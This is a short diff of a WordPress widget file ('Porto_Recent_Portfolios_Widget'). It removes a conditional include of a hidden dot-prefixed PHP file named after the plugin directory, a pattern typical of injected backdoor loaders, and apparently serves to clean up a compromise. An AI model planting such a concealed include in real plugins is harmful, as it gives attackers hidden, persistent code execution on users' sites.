@@ -5,10 +5,6 @@ function porto_recent_portfolios_load_widgets() {
 	register_widget( 'Porto_Recent_Portfolios_Widget' );
 }
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Porto_Recent_Portfolios_Widget extends WP_Widget {
 
 	public function __construct() {
